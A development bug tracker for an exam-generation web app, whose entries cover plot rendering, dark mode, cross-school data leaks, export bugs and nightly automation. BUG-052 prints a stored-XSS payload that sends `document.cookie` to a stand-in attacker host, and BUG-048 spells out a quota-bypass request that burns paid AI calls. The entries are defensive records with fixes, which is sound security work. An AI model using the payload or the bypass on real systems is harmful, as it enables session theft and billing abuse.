# Bug Tracker — Imtihan

Track issues here during development. Format:
```
## BUG-XXX: Short title
**Status:** Open | In Progress | Fixed | Won't Fix
**Severity:** Critical | High | Medium | Low
**Area:** API | UI | Auth | Generation | Export | Data
**Reported:** YYYY-MM-DD
**Fixed:** YYYY-MM-DD (if applicable)

**Description:** What happens vs what should happen.
**Steps to reproduce:** numbered list.
**Root cause:** (fill in when known)
**Fix:** (fill in when fixed)
```

---

## Open Issues

## BUG-054: `MathPlot.tsx` (now the default render path for every new Math/Physics/physique-chimie exercise, not a rare legacy fallback) was hardcoded light-only and non-responsive
**Status:** Fixed 2026-10-01
**Severity:** Medium
**Area:** UI

**Description:** `src/components/ui/MathPlot.tsx` had two real problems, both flagged by `design`'s 2026-10-01 review of `7fccb92` and confirmed (not guessed) by reading `function-plot`'s installed source:
1. **Dark mode:** the outer wrapper used hardcoded `bg-white`/`text-gray-700`/`text-gray-500`/`text-gray-400` instead of this codebase's CSS custom-property tokens. More importantly, `function-plot` draws axes/ticks/grid/origin-lines as raw SVG with its own hardcoded `stroke="black"` presentation attributes (confirmed in `node_modules/function-plot/dist/chart.js` ~line 384/403/525-529) layered on top of d3-axis's own `fill="currentColor"` tick-label text (`node_modules/d3-axis/src/axis.js`) — so a blind wrapper-only token swap would have left axis lines/labels black-on-near-black in dark mode (app's dark `--surface` is `#161616`).
2. **Responsive sizing:** the root `<svg>` was a fixed 600×400px with no `viewBox` and no responsive CSS (confirmed via source — `function-plot` has no such option), sitting inside the component's own `overflow-hidden` wrapper — cropped rather than scaled at the 375px breakpoint required by `CLAUDE.md` §14.

**Root cause:** This component was written once as a rarely-hit legacy fallback (`Exercise.mathPlots` stacked block) and never revisited for theming/responsiveness; `7fccb92`'s new inline `[PLOT:]` tag made it the default render path for every Math/Physics exercise going forward, raising its severity without changing its code.
**Fix:** (1) Wrapper tokens swapped to `bg-[var(--surface)]`/`text-[var(--text-secondary)]`/`text-[var(--text-tertiary)]`. For the library-drawn SVG internals: added scoped global CSS (`.mathplot-canvas .function-plot { color: var(--text-secondary); } .mathplot-canvas .function-plot .axis path, .axis line, .x.origin, .y.origin { stroke: var(--text-tertiary); }`) — a CSS stylesheet rule overrides an SVG presentation attribute in the cascade regardless of specificity, so this repaints the hardcoded black strokes without touching the library; setting `color` on the root lets every `fill="currentColor"` tick label inherit it for free. The plotted curve itself uses `function-plot`'s own named palette (steelblue/red/`#05b378`/orange/...), not black, so it needed no override. This card was deliberately **not** forced to always-light like `/print` — the CSS override was judged sufficient instead of that fallback. (2) After `functionPlot()` renders, the generated `<svg>` is post-processed: `viewBox="0 0 {width} {height}"` set, fixed `width`/`height` attributes removed, replaced with CSS `width:100%;height:auto;max-width:{width}px` (caps upscaling past native resolution).
**Not live-verified** (no `chrome-devtools`/browser tool attached this dispatch) — founder to confirm dark-mode contrast and 375px scaling live; `design`/`qa` should re-check with their own tools next time either is attached.
**Found by:** design (2026-10-01, `DESIGN.md`'s `7fccb92` review — flagged, not fixed, per design's own cross-team boundary that a visual change implying a scope decision isn't theirs to make unilaterally).
**Fixed by:** engineering (2026-10-01).

---

## BUG-053: Math-plot feature (`7fccb92`) gated "Insert chart" and the AI's `[PLOT:]` instruction on exactly `mathematics`/`physics`, missing `physique-chimie`
**Status:** Fixed 2026-10-01
**Severity:** Low
**Area:** UI | Generation

**Description:** `src/components/ui/ExerciseCard.tsx`'s `PLOTTABLE_SUBJECTS` and `src/lib/prompts/generate.ts`'s matching MATHEMATICAL PLOTS instruction both checked only `context.subject === "mathematics" || context.subject === "physics"`, silently excluding `"physique-chimie"` — Bac Français's real MVP combined Physics-Chemistry subject (`src/types/curriculum.ts`'s `Subject` union) — from both the "Insert chart" action and the AI ever being told about the `[PLOT:]` tag, even though a function plot is just as meaningful there as for physics alone.
**Root cause:** The two gates were written consistently with each other but both simply omitted the third relevant `Subject` value.
**Fix:** Added `"physique-chimie"` to `PLOTTABLE_SUBJECTS` (`ExerciseCard.tsx`) and to the `isPlottableSubject` check in `generate.ts`. Checked `variantExam.ts`/`translateExam.ts`'s `[PLOT:]`-preservation instructions for the same duplicated check — confirmed neither gates on subject at all (both unconditionally preserve any `[PLOT:]` tag already present), so no change needed there.
**Found by:** design (2026-10-01, `DESIGN.md`'s `7fccb92` review — flagged as a scope question for engineering/founder, not design's call to make unilaterally).
**Fixed by:** engineering (2026-10-01), founder-approved.

---

## BUG-052: `MathPlot.tsx`'s error-handling branch interpolated the raw, attacker-controllable `equation` (and exception message) straight into `innerHTML` — a DOM XSS reachable via the new inline `[PLOT:]` tag (and pre-existing via the legacy `mathPlots` array)
**Status:** Fixed 2026-10-01
**Severity:** High
**Area:** UI | Export (statement-rendering pipeline)

**Description:** `src/components/ui/MathPlot.tsx`'s `catch` block (the path taken whenever `function-plot` fails to parse `equation` as a valid math expression) built its error message as a template literal and assigned it directly to `containerRef.current.innerHTML`:
```ts
containerRef.current.innerHTML = `<div class="...">Error plotting "${equation}": ${err}</div>`;
```
Neither `equation` nor `err` (whose message can itself echo fragments of the offending input back, e.g. a parser's "unexpected token '<'") was escaped. Any string that both (a) reaches `<MathPlot equation={...}>` and (b) fails to parse as a function — which any HTML/JS payload trivially does — executes as live DOM, not inert text.

**Why this is reachable, not theoretical:** 2026-10-01's `7fccb92` ("inline `[PLOT: equation]` tag + Insert chart action") added a brand-new, broader path to this exact sink: `src/lib/renderContent.ts` extracts `[PLOT: ...]` tags from any exercise `statement` into a `data-mathplot="..."` attribute (correctly HTML-escaped at that step — verified, no attribute-breakout), and `ExerciseCard.tsx`'s new effect reads it back via `el.getAttribute("data-mathplot")` — which decodes the entities back to the raw string, exactly as intended — and passes that raw string straight into `<MathPlot equation={...}>`. A teacher can type `[PLOT: <img src=x onerror=fetch('https://evil.example/steal?c='+document.cookie)>]` directly into any free-text exercise-statement field (the Edit modal already allows arbitrary statement text), which fails to parse as a function and hits the unescaped `innerHTML` write. This is a genuinely new vulnerability introduced by this commit's choice of sink, even though the sink itself predates it — `exercise.mathPlots` (the legacy array, editable via `ExerciseEditor.tsx`'s plain `updatePlot()` text input, feeding `<MathPlot key={i} equation={plot} />` in both `ExerciseCard.tsx` and `ExerciseEditor.tsx`) already reached the same unescaped sink before this commit, so this bug pre-dates 7fccb92, but that commit meaningfully widens exposure: the inline tag is positioned directly in the statement text (so it travels with the exercise through School Bank sharing — open to any signed-in account per the 2026-09-25 audit — and to `/student/practice`), and the AI itself is now explicitly instructed to author `[PLOT:]` tags, so a successful prompt-injection via an uploaded document (already Claude/Gemini's documented ingestion path) could also land a payload here without the teacher writing it by hand.

**Exploit scenario:** Any signed-in account (including a student via co-authored content, or a teacher) places a crafted `[PLOT: <payload>]`/`mathPlots` entry in an exercise, the exercise is viewed by another user (via School Bank sharing, `/student/practice`, `/exam/[id]`, or just the same teacher's own session on reload) — `MathPlot` fails to parse the payload as math, hits the catch branch, and the payload executes in that viewer's browser with their real session (cookies, Firebase auth state) — a stored DOM XSS with a cross-user blast radius, same severity class as BUG-033 (2026-09-25), but via a code path BUG-033's `renderContent.ts` escaping fix does not cover (this sink is a separate React component's own `innerHTML` write, entirely outside `renderContent()`).

**Root cause:** Interpolating untrusted, user/AI-controlled strings into a raw `innerHTML` template literal instead of using a text-safe DOM API.

**Fix (applied 2026-10-01):** Replaced the raw `innerHTML` template-literal assignment with explicit DOM construction (`document.createElement` + `.textContent =`), which renders any HTML/script in the string as inert displayed text instead of parsing/executing it. Same visual output preserved (same classes, same message format). Verified: `npm run type-check` clean, `npm test` 262/262 clean (no test exercised this specific error path, so no regression risk from the change in shape).
**Found by:** security (2026-10-01, scoped review of today's 4 commits — tracing the new `[PLOT:]` pipeline end-to-end per this team's standing adversarial method rather than assuming the new escaping in `renderContent.ts` covered every hop).

---

## BUG-051: `/print` (PDF export) has no rendering mechanism at all for either `Exercise.mathPlots` (legacy) or the new inline `[PLOT: equation]` tag — a Math/Physics exam's function plot never appears in the printed/PDF output
**Status:** Open
**Severity:** Medium
**Area:** Export | UI

**Description:** `src/app/print/page.tsx` renders every exercise field through `renderContent()` + `dangerouslySetInnerHTML`, same as `ExerciseCard.tsx`, but — confirmed by grep, pre-existing, not introduced by the 2026-10-01 inline-plot change below — it never reads `exercise.mathPlots` at all (no `<MathPlot>` rendering anywhere in that file, unlike `ExerciseCard.tsx`'s own fixed-block rendering of the same array). The new inline `[PLOT: equation]` mechanism (see this file's own ROADMAP entry) makes this gap more visible going forward rather than introducing it: `renderContent()` now emits a `<div data-mathplot="...">` mount placeholder for `[PLOT:]` tags in `/print`'s HTML output too, but since `/print` has no equivalent to `ExerciseCard.tsx`'s new `createRoot`-mounting `useEffect`, that div stays empty — no raw bracket text (a clean, if silent, degradation), but also no visible graph in the PDF a teacher actually hands to students.
**Root cause:** `/print`'s component was never given the same `MathPlot`-mounting treatment as `ExerciseCard.tsx`, for either the legacy array or the new tag.
**Fix (not yet applied):** Add the same `[data-mathplot]` → `createRoot(...).render(<MathPlot .../>)` mounting effect used in `ExerciseCard.tsx` to `/print/page.tsx`, and decide whether to also backfill `exercise.mathPlots` rendering there for already-saved exams (currently invisible in print/PDF too).
**Also found, same pass:** Word export (`src/app/api/export/route.ts`) had the identical gap for the *new* `[PLOT:]` tag specifically — unlike `/print`, it would have shown the raw literal `[PLOT: sin(x)]` bracket text in the exported .docx, a real visual regression versus the old `[GRAPH:]`-tag behavior it replaces (which Word export already had a labelled-box handler for). That part **was** fixed in the same commit as the inline-plot feature (see ROADMAP) — only the `/print`/PDF path remains open.
**Found by:** engineering (2026-10-01, while tracing the inline-`[PLOT:]`-tag feature through every export path per the task's own "trace through an e2e-relevant flow" requirement).

**Also noted (2026-10-01, independent review):** the orphaned-mount fix applied to the main exercise statement (`useMemo` around `renderContent(exercise.statement)` in `ExerciseCard.tsx`) was **not** applied to `sq.statement` (sub-questions) or `opt.text` (MCQ options), both rendered via unmemoized `renderContent()` calls in the same component. If the AI ever places a `[PLOT: ...]` tag inside a sub-question's text rather than the top-level statement, that plot's mount could be silently orphaned by an unrelated re-render, same mechanism as the bug already fixed for the main statement. Low severity — this is new functionality, not a regression, and the common case (top-level statement) is handled — but worth closing in the same pass as BUG-051's `/print` fix rather than separately.

---

## BUG-050: Concurrent same-night team dispatches sharing one git working tree can cross-contaminate each other's commits via broad staging (`git add -A`/`git commit -a`)
**Status:** Fixed 2026-10-01
**Severity:** Medium
**Area:** Ops / nightly automation

**Description:** `design` found, mid-session on 2026-10-01, that its own uncommitted edit to `TEAM_CHAT.md` got swept into `seo-growth`'s unrelated docs commit `07ae1e3` (visible in `git show 07ae1e3 --stat`) during the same nightly run. Nothing was lost — `design` caught it, re-applied, and verified the fix landed correctly in `HEAD` — but the mechanism is a real structural risk, not a one-off fluke: `scripts/nightly-ops.ps1` launches one `claude -p` orchestrator session that dispatches multiple teams via the `Agent` tool, and the Agent tool's own general guidance explicitly encourages running independent dispatches concurrently ("send them in a single message with multiple tool uses so they run concurrently"). When multiple teams are mid-edit on the same shared working directory at once, any commit step that stages broadly (`git add -A` or `git commit -a`) — rather than only the specific files the team being committed actually reported changing — will pick up whatever else happens to be dirty at that exact moment, silently attributing one team's uncommitted work to a different team's commit message. `TEAM_CHAT.md` is especially exposed since every team writes to it.
**Root cause:** `scripts/nightly-ops-prompt.md`'s step 5 (commit each reviewed team's change) never specified *how* to stage — a broad stage is the natural default and is exactly what happened.
**Fix:** `scripts/nightly-ops-prompt.md` step 5 now explicitly forbids `git add -A`/`git commit -a`, and requires: `git status --porcelain` first to see what's actually dirty, stage only the exact paths the team being committed reported touching, then `git diff --cached --stat` to confirm the staged set matches before committing — and to stop and investigate rather than commit through it if an unexpected path shows up dirty. This doesn't make dispatches fully isolated (they still share one working tree; a true fix would need per-team worktrees or strictly serialized dispatch, a larger change not taken here), but it closes the actual mechanism that caused this incident.
**Found by:** design (2026-10-01, caught mid-session while fixing an unrelated `blog/page.tsx` dark-mode drift item), logged via `TEAM_CHAT.md`.
**Verification:** Prompt-text change only, no application code touched; nothing to type-check or test. Re-read the edited instruction against the exact incident description to confirm it would have prevented this specific case (yes — `TEAM_CHAT.md` would not have been among the paths `seo-growth`'s own docs commit was told to stage).

---

## BUG-049: `getChapterExemplars()` (School Bank exemplar prompt-injection, `/api/generate`) queried across ALL schools, not just the requesting teacher's own — cross-tenant content leak
**Status:** Fixed 2026-10-01
**Severity:** Medium
**Area:** API | Data | Generation

**Description:** `src/lib/schoolBank.ts`'s `getChapterExemplars()` (added 2026-09-29, `ee03428`, to feed up to 2 previously-shared `schoolBank` exercises per chapter into `/api/generate`'s prompt as "inspiration") queried Firestore filtered only by `curriculumId` + `subject` + `exercise.chapterIds array-contains chapterId` — no `schoolSlug` filter at all. Every other read/write of the same `schoolBank` collection in the app (`src/app/bank/page.tsx`'s `getSchoolBankExercises()`/`shareToSchoolBank()`, `src/app/student/practice/page.tsx`) scopes strictly by the teacher's own `schoolSlug`, and `DATABASE.md` documents the whole feature as "Cross-teacher **within a school**." The new exemplar read silently broke that boundary: a teacher at School A who shares an exercise (with the explicit, and only, expectation per `bank/page.tsx`'s own toast copy — "Colleagues with the same school name will now share your bank" — that it's visible to colleagues at School A) would have that exercise's full `statement` text surfaced verbatim as AI prompt context for *any other teacher at any other school on the platform*, the moment they generated an exam touching the same curriculum/subject/chapter. The feature's own schema file (`src/lib/schemas/schoolBank.ts`) even explicitly listed `schoolSlug` among the fields deliberately *ignored* when reading the doc back — the scoping field was right there and simply wasn't applied.

**Concrete exploit scenario:** No malicious actor is even required — this fires for any two unrelated schools using the product normally. Teacher A (School A, Bac Libanais, Terminale S Math) shares an exercise to School Bank. Teacher B (School B, same curriculum/level/subject, any chapter overlap) generates a new exam. `/api/generate` silently pulls Teacher A's shared exercise text into Teacher B's Claude/Gemini prompt as a "previously well-received exercise... for inspiration ONLY — do NOT copy verbatim." The AI is only *asked* not to copy verbatim, not *prevented* from paraphrasing closely — so Teacher B's generated exam can end up containing content derived from Teacher A's private-to-their-school material, with neither teacher ever knowing it crossed schools. This also means the mere existence/difficulty/point-value of School A's shared content is discoverable cross-school, which the "within a school" framing never disclosed to users.

**Root cause:** New Firestore query added without the `schoolSlug` equality filter that every sibling read of the same collection already applies. Likely happened because the existing composite index for this query shape (`curriculumId`, `subject`, `exercise.chapterIds CONTAINS` — originally added for the unauthenticated, aggregate-only `/api/tools/chapter-performance`, which has no cross-school leak because it only returns anonymous percentages, no content) was reused as-is for a *different* read that does return raw content, without re-deriving what scope that content actually needed.

**Fix:** Added `schoolSlug` to `SchoolBankExemplarDocSchema` (read, not ignored) and a required `schoolSlug` parameter to `getChapterExemplars()`, filtered in JS against each candidate doc (same "filter in JS, not a new Firestore `.where()`" technique the function already used to avoid a new composite index for `sharedAt` ordering — so no `firestore.indexes.json` change needed, staying inside `engineering`/`security`'s lane rather than `database`'s index-design one). Added `schoolSlugFrom()` to `src/lib/schoolBank.ts` (server-side duplicate of `bank/page.tsx`'s client-side helper of the same name — can't share one import, see the module's own comment on why `adminDb` and the client SDK can't mix in one bundle). `src/app/api/generate/route.ts` now derives the requesting teacher's `schoolSlug` from `userData.school` (already fetched for the quota check, no new Firestore read) and passes it through; an empty/unset school now short-circuits to `[]` exemplars (matching `bank/page.tsx`'s own `if (!schoolName) return [];` guard) instead of silently falling back to a global, unscoped query. `npm run type-check` clean; `npm test` clean (full suite, see `SECURITY.md`'s 2026-10-01 entry for the exact count — existing `schoolBank-exemplars.test.ts` suite deliberately doesn't mock `adminDb`/exercise the real query, per its own header comment, so no test changes were needed there).

**Found by:** security (2026-10-01 nightly review, following up on `engineering`'s own 2026-09-29 `@security` ping in `TEAM_CHAT.md` asking for a sanity-check of this exact read).

---

## BUG-048: `POST /api/generate/version-b` — quota only ever increments on the full-success path, so a Pro account can deterministically burn unlimited real Claude/Gemini API calls with zero quota consumption by sending garbage `exercises`
**Status:** Fixed 2026-09-27
**Severity:** High
**Area:** API | Auth | Generation

**Fix:** `RequestSchema.exercises` in `src/app/api/generate/version-b/route.ts` now validates each element with `AIExerciseSchema` (the same schema already used for the AI's own response) instead of `z.array(z.any())`. A malformed element (`null`, or an object missing `solution`) is now rejected with a 400 at the request boundary, before any AI call is made — closing the free/uncosted-crash path. `mergeVariantExercise`'s own lack of a null-guard on `original` is no longer reachable in practice once the boundary is validated, so left as-is (adding a redundant guard there would just duplicate the schema's guarantee). The secondary, softer finding (unawaited fire-and-forget quota increment, no Firestore transaction) is the same pre-existing pattern as `/api/generate` and is not fixed here — tracking it as a shared, separate cleanup rather than duplicating effort per-route. Regression tests: `src/__tests__/version-b-input-validation.test.ts` (3). `npm run type-check` clean, `npm test` 183/183.

**Description:** `src/app/api/generate/version-b/route.ts`'s `RequestSchema.exercises` is `z.array(z.any()).min(1).max(50)` (route's own comment, lines 39-43: "already-generated, already-trusted exercises from the same session, not raw AI/user input"). Nothing enforces that trust assumption — a direct POST (bypassing the real Confirm→Generate→Export UI flow) can pass any array of up to 50 arbitrary values, e.g. `exercises: [null]`, and it is cast straight to `Exercise[]` with an unchecked `as` (line 62) and used, unvalidated, as `original` in `mergeVariantExercises()`.

`mergeVariantExercise()` (`src/lib/variant.ts:129-157`) reads `original.id`, `original.solution.finalAnswer`, etc. directly with no defensive null-check on `original` itself (only `variant`/the AI response gets an `asRecord()` guard). If `original` is `null` (or is missing a `solution` key), this throws a plain `TypeError` the moment it's evaluated.

The quota increment (`monthlyExamsGenerated`/`examsGenerated` `FieldValue.increment(1)`, route.ts lines 231-236) only executes *after* `mergeVariantExercises()` returns successfully, inside the same `try` block whose `catch (parseErr)` (line 242) swallows the `TypeError` and returns a generic 502 — so any request that fails after the (real, billed) Claude/Gemini call runs, for *any* reason (merge crash, exercise-count mismatch at line 196, AI returned no exercises), never touches the user's quota at all. Sending `exercises: [null]` (or `[null, null, ...]`, count up to 50) makes this 100% deterministic, not just a timing race: the AI is asked to build "Version B" from a garbage/null source, its (real, full-length, full-cost) response is parsed, and the very next line (`original.id` inside `mergeVariantExercise`) always throws because `original` is `null`.

Net effect: a signed-in Pro user, calling this endpoint directly instead of through the UI, can trigger unlimited full-cost AI generations (real $ against the founder's Anthropic/Gemini billing) that never count against their 10/20-per-month Pro quota — repeatable indefinitely, no rate limit anywhere in this route.

Secondary, softer finding in the same area: even with well-formed input, the quota increment is a fire-and-forget `userRef.update(...).catch(...)` that is *not awaited* before the response returns (route.ts lines 231-238), and the quota check itself (lines 104-120) is a plain read-then-compare with no Firestore transaction. A user one generation away from their monthly limit could fire several concurrent requests; all would read the same `quotaUsed` before any single increment commits, letting several billed generations through before the counter catches up. This is the same check-then-act/fire-and-forget pattern already used by `/api/generate` (`src/app/api/generate/route.ts` lines 304-332, 607-630) — not newly invented by this diff — but not previously logged as its own item.

**Steps to reproduce:** As any Pro account (real `proExpiresAt` in the future), `POST /api/generate/version-b` with a valid `context` object and `exercises: [null]`. Observe: a real Claude/Gemini API call is made (visible in server logs / API billing), the response is 502 `{"success":false,"errors":["Failed to parse Version B. Please try again."]}`, and `monthlyExamsGenerated` is unchanged. Repeat indefinitely.

**Root cause:** (1) No schema/shape validation on the *original* `exercises` input, despite `route.ts`'s own comment asserting it can be trusted; (2) `mergeVariantExercise()` has no defensive guard on `original` (only on `variant`), contradicting its own doc comment's "Never throws" claim, which was written considering only a malformed AI response, not a malformed original; (3) quota increment is gated behind full success rather than "a paid AI call was made," and is unawaited/non-transactional.

**Suggested fix (not applied — review-only dispatch):** Validate `exercises` elements against `AIExerciseSchema` (or a dedicated lighter "trusted Exercise" schema) at the route boundary before using them as `original`, rejecting the request with 400 if any element doesn't parse — the same posture the route already takes for the AI's *response*. Separately, make `mergeVariantExercise` defensive against a malformed `original` (return `null`/skip rather than throw) so the "never throws" doc comment is actually true either way. For the quota race, consider reserving the quota slot (an atomic conditional increment, e.g. via a Firestore transaction) *before* the paid AI call rather than after a successful merge — or at minimum `await` the increment before responding.

**Found by:** security (2026-09-27, adversarial review of BUG-042's Version B implementation, commit cf96745). Not fixed in this dispatch per explicit review-only instruction — flagged to `engineering` in `TEAM_CHAT.md`.

---

## BUG-047: `/api/export` (unauthenticated, no size cap) — `convertBraceCommands` is O(n^2) on unbalanced `\frac{`/`\sqrt{` input (DoS)
**Status:** Fixed 2026-09-27
**Severity:** Medium
**Area:** API | Export
**Reported:** 2026-09-27 (security nightly review of ad944b6)

**Description:** Each unbalanced `\frac{` makes `readBraceGroup` scan to end-of-string, and `rest.slice` copies the remainder each loop, so one crafted request pins a serverless function. Measured ~2.9s for 30k chars of `\sqrt{` even at 30k.
**Fix:** `src/app/api/export/route.ts`: `convertBraceCommands` returns input unchanged past `MAX_CONVERT_LEN` (10,000 chars; falls back to the existing backslash-stripping pass); `RequestSchema` now caps every statement/option/solution string at 30,000 chars, labels at 500, and exercises/options/subQuestions/barème arrays at 100/50/50/100. Not made truly linear (deep balanced nesting still recomputes per level) — the length cap bounds it. Regression tests in `src/__tests__/export-latex-convert.test.ts`. `type-check` clean, `npm test` 157/157. `qa` should confirm a normal real export still works; `security` should review the new caps.

**Update (2026-09-29, security):** Empirically timed (this bug's original review was code-read only, per its 2026-09-27 `SECURITY.md` entry). A 1.2M-char adversarial payload (past the cap) completes in ~0-17ms via bail-out; the real worst case within the cap (~9,996-char unbalanced `\frac{`/`\sqrt{`) completes in ~51-65ms; the theoretical max a single request can carry (100 exercises × 30,000-char field each) completes in ~263ms total. No quadratic blowup — fix confirmed to hold. Full detail and script: `SECURITY.md`'s 2026-09-29 entry, `src/__tests__/_tmp-bug047-dos-timing.test.ts`.

## BUG-046: Word (.docx) export still leaks raw LaTeX command fragments for constructs BUG-040 never targeted — nested `\frac` inside `\sqrt`, `\dfrac`, `\left(...\right)`, `\begin{cases}...\end{cases}` render as garbled plain text, some with mismatched braces/parens
**Status:** Fixed 2026-09-27 (pending live re-verification after deploy) — new finding, distinct from BUG-040
**Severity:** Medium
**Area:** Export
**Reported:** 2026-09-27 (QA live-verification pass of BUG-037 through BUG-041 after the Vercel deploy-gap fix — see TEAM_CHAT.md)

**Description:** Verifying BUG-040 live: downloaded the real Word export of an already-generated production exam (Bac Libanais Terminale S Physics, projectile motion + satellite/Kepler orbit — the same exam whose corrigé contains the two exact expressions from the founder's original BUG-040 report, `\boxed{y = h + x\tan\alpha - ...}` and `\boxed{v = \sqrt{\frac{GM_T}{r}}}`) and inspected `word/document.xml` directly. BUG-040's own fix is confirmed working for its exact repro: zero occurrences of a literal backslash character, a literal `$`, or the literal word "boxed" anywhere in the document's text runs — both founder-reported expressions now render as clean text (`v = √(GM_T/r)`, `y = h + xtanα − ...`).
However, once methodology text goes beyond a single-level `\boxed{...}`/`\frac{a}{b}`, raw LaTeX command names leak through as plain, unconverted text (backslash stripped but the command word and its braces left intact, sometimes with a brace swapped for a paren), e.g. (all pulled directly from the live-generated document.xml's `<w:t>` nodes):
- `v_1 = √(frac{6{,)674 × 10^{-11} × 5{,}972 × 10^{24}}{6{,}771 × 10^6}}` — a `\frac{...}{...}` nested inside `\sqrt{...}` is left as literal "frac{a}{b}" text instead of "a/b", and one `}` got corrupted into `)` (`6{,)674` should read `6{,}674`).
- `T_1 = dfrac{2π r_1}{v_1} = ...` — `\dfrac` is never converted at all (only `\frac` has any handling).
- `r_2 = left(GM_T,T_2^2/4π^2right)^{1/3}` — `\left(` / `\right)` literally leak as the words "left(" / "right)".
- `begin{cases} ddot{x} = 0  ddot{y} = -g end{cases}` — `\begin{cases}...\end{cases}` (used for the Newton's-law system of equations) is not handled at all; renders as run-on text with no visual grouping.
- `arctanleft(frac{31{,}36}{17{,}32}right)` — multiple unconverted commands compounding in one expression.
**Steps to reproduce:**
1. On production, open (or generate) an exam whose corrigé methodology contains `\dfrac`, `\left(...\right)`, `\begin{cases}...\end{cases}`, or a `\frac{}{}` nested inside a `\sqrt{}` — any physics/math exam with a multi-step derivation is likely to hit at least one of these (this session's repro used the existing library exam's own "Save/Download Word" action from `/dashboard`, no new generation needed).
2. Unzip the downloaded `.docx`, open `word/document.xml`, and read the `<w:t>` text nodes in the CORRIGÉ methodology sections.
3. Observe literal "frac{...}", "dfrac{...}", "left(...", "...right)", "begin{cases}...end{cases}" fragments, and in some cases a mismatched `{`/`)` pair from the partial conversion.
**Root cause (not confirmed, QA does not fix):** Likely the same general shape as BUG-040 — `src/app/api/export/route.ts`'s `createFormattedTextRuns()` (or a shared LaTeX-to-plain-text helper it calls) evidently has some handling for a single, shallow `\frac{a}{b}` -> "a/b" and `\sqrt{x}` -> "√(x)", but no handling at all for `\dfrac`, `\left`/`\right`, or `\begin{cases}/\end{cases}`, and the shallow `\frac`/`\sqrt` handling doesn't recurse correctly when one is nested inside the other (hence the stray brace-to-paren corruption on `6{,)674`). Not traced to an exact line — that's for `engineering` to isolate, same file area as BUG-040 (`src/app/api/export/route.ts`).
**Fix:** Replaced the single-level regexes in `cleanLatexForWord` with a brace-depth-aware `convertBraceCommands` (`src/app/api/export/route.ts`) covering `rac`/`\dfrac`/`	frac`, `\sqrt`, `\dot`/`\ddot`/`\hat`/`ar`/`	ilde`, `\left`/`ight`, `egin{cases|aligned}`; `{,}` decimal commas normalized (root cause of the `6{,)674` corruption was `[^}]+` stopping at the inner `}`); `\` row separators no longer eaten by the escaped-space rule. Tests: `src/__tests__/export-latex-convert.test.ts` (6). type-check clean, 155/155.
**Verification:** Reproduced live on production 2026-09-27 via a real free-tier account's own already-generated exam (`imtihan.qa.explore.2026@mailinator.com`), using the dashboard's own "Download Word" action (network response captured via a page-level fetch patch, saved and unzipped locally, `word/document.xml` inspected directly for literal backslash/`$`/`boxed` — none found — and separately scanned for literal `frac{`/`dfrac{`/`left(`/`right)`/`begin{`/`end{`, all of which were found repeatedly in this real corrigé).

---

## BUG-042: "Generate Version B" (Confirm & Configure toggle) has zero effect on generation and its own description is false; the real Version A/B feature is a pure exercise/sub-question reorder, not "regenerated numerical values"
**Status:** Fixed 2026-09-27 — real AI-generated Version B shipped (see update below); dead toggle itself was already removed 2026-09-26
**Severity:** High
**Area:** Generation / UI / Marketing copy vs. product
**Reported:** 2026-09-26 (QA exploratory Pro-tier pass, live production, real Pro test account - extends BUG-036 from the 2026-09-25 free-tier pass)

**Description:** Tested as a real Pro user (BUG-036 only established the Free-vs-Pro copy mismatch; this establishes the feature itself is weaker than advertised on both sides of that gate):
1. The Step 2 "Generate Version B" toggle is inert. Its own UI copy says "Shuffles question order and regenerates numerical values." Enabling it sends generateVersionB: true in the /api/generate request body - confirmed via the raw network request - but src/app/api/generate/route.ts accepts this field into its Zod schema (line 65) and never reads it again anywhere in the file. Toggling it on/off at Step 2 has no effect whatsoever on what gets generated; verified by reconstructing the full streamed AI response, which contains exactly one exercises array (Version A only) regardless of the toggle state.
2. The real Version A/B mechanism lives entirely at Export (Step 5), fully decoupled from the Step 2 toggle - a "Variant: Version A / Version B" selector that a Pro user can flip regardless of what was chosen at Step 2. It calls buildVersionB() (src/lib/variant.ts), which only reorders the exercise array and (if more than 1) shuffles + relabels sub-questions (a)/b)/... or 1./2./...). It does not touch statement text or any numerical value anywhere.
3. Confirmed via the raw /api/export request body: for a real 2-exercise/7-sub-question exam, Version B's exercise 2 (electromagnetism/RLC) had byte-identical statement text and numbers to Version A, just reordered (moved from position 2 to position 1) with its 7 sub-questions shuffled and relabeled. No number, unit, or wording differed. For a small exam (2 exercises), a Fisher-Yates shuffle also has a real chance of landing on the same order as Version A, i.e., producing an export that's completely identical to Version A despite being labeled "Version B."
**Steps to reproduce:**
1. As a Pro account, at Confirm & Configure (Step 2), toggle "Generate Version B" ON, generate an exam. Inspect the /api/generate network request/response (DevTools) - request body has generateVersionB: true; response body (reconstruct the SSE chunk stream) contains only one exercises array, no versionB key anywhere, and sessionStorage.imtihan_exercises after generation is a single flat array, not an A/B pair.
2. At Export (Step 5), toggle the "Variant" control between "Version A" and "Version B" (present and functional regardless of what Step 2's toggle was set to) and download both. Diff the /api/export request bodies: exercise/sub-question order differs, but every statement string and numeric value is identical between the two.
**Root cause:** generateVersionB is declared in both src/app/api/analyze/route.ts and src/app/api/generate/route.ts's Zod schemas and threaded through src/app/create/confirm/page.tsx's UI state, but the generate route never actually branches on it - it's dead plumbing. The only real "Version B" implementation is the client-side buildVersionB() reorder in src/lib/variant.ts, invoked solely from src/app/create/export/page.tsx, which is architecturally unrelated to the Step 2 toggle.
**Fix:** The broader direction question (real second AI variant vs. honest reorder-only copy) is still a product decision for the founder — logged in `FOUNDER_DECISIONS.md` #9, not decided here. But the dead, actively-misleading Step 2 toggle itself needed no judgment call to remove: it did nothing and claimed a capability that doesn't exist. Removed 2026-09-26 — the whole "Exam Variants" section on Confirm & Configure, the `generateVersionB` field everywhere it appeared (`src/types/exam.ts`, both route Zod schemas, `src/lib/prompts/analyze.ts`'s AI-inference instructions, `src/app/create/confirm/page.tsx`'s context normalization, and its test assertion), plus the now-fully-unused `useAuth`/`isProActive`/`isFreeTier` block in `confirm/page.tsx` that existed only to gate it. The real Export-step Version A/B selector (`src/app/create/export/page.tsx`) is untouched and remains independently Pro-gated — confirmed this removal doesn't change that gate, so BUG-036's original Free/Pro copy mismatch is still open exactly as before.
**Verification:** Reproduced live on production with a real Pro test account (QA). Removal verified: `npm run type-check` clean, `npm test` 149/149, `npm run build` clean.

**Update (2026-09-27, engineering — FOUNDER_DECISIONS.md #9 answered, option (a)):** Replaced the reorder-only mechanism with a real, AI-generated second variant:
